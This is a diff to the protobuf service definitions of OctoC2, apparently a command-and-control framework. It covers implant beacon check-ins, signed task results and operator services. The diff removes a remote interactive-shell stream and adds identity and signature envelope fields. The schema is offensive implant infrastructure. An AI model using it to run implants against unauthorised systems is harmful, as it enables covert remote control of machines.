@@ -4,16 +4,12 @@ package svc;
 
 // ── OctoC2 gRPC Service Definitions ──────────────────────────────────────────
 //
-// Used for the Codespaces SSH tunnel tentacle (Tentacle 4) and
-// the Pull Request + gRPC channel (Tentacle 8).
+// Used for the authenticated Codespaces SSH tunnel tentacle (Tentacle 4).
 //
-// Generate TypeScript bindings:
+// Generate the shared runtime schema module:
 //   bun run proto:gen
-// Or manually:
-//   protoc --plugin=protoc-gen-ts_proto \
-//     --ts_proto_out=server/src/proto \
-//     --ts_proto_opt=outputServices=grpc-js \
-//     proto/svc.proto
+// Verify the committed consumer has not drifted:
+//   bun run proto:check
 
 // ── Common types ──────────────────────────────────────────────────────────────
 
@@ -47,7 +43,9 @@ message TaskResult {
   string output       = 4;
   string data         = 5;  // base64url optional binary payload
   string completed_at = 6;
-  string signature    = 7;  // ed25519 detached sig of (task_id + output + completed_at)
+  string signature    = 7;  // serialized canonical Ed25519 result envelope
+  string metadata_json = 8; // canonical JSON object; empty when metadata is absent
+  bool   has_data      = 9;  // distinguishes absent data from present empty data
 }
 
 // ── Beacon Service (used by implants) ─────────────────────────────────────────
@@ -61,6 +59,7 @@ message CheckinRequest {
   string arch       = 6;
   int32  pid        = 7;
   string checkin_at = 8;
+  string identity_envelope = 9;
 }
 
 message CheckinResponse {
@@ -84,19 +83,6 @@ service BeaconService {
   rpc Checkin (CheckinRequest) returns (CheckinResponse);
   // Beacon submits completed task output
   rpc SubmitResult (SubmitResultRequest) returns (SubmitResultResponse);
-  // Bidirectional stream for interactive shell (Tentacle 8)
-  rpc InteractiveShell (stream ShellInput) returns (stream ShellOutput);
-}
-
-message ShellInput {
-  string beacon_id = 1;
-  bytes  data      = 2;  // raw stdin bytes
-}
-
-message ShellOutput {
-  bytes  data      = 1;  // raw stdout/stderr bytes
-  bool   exit      = 2;
-  int32  exit_code = 3;
 }
 
 // ── Operator Service (used by octoctl / dashboard) ────────────────────────────
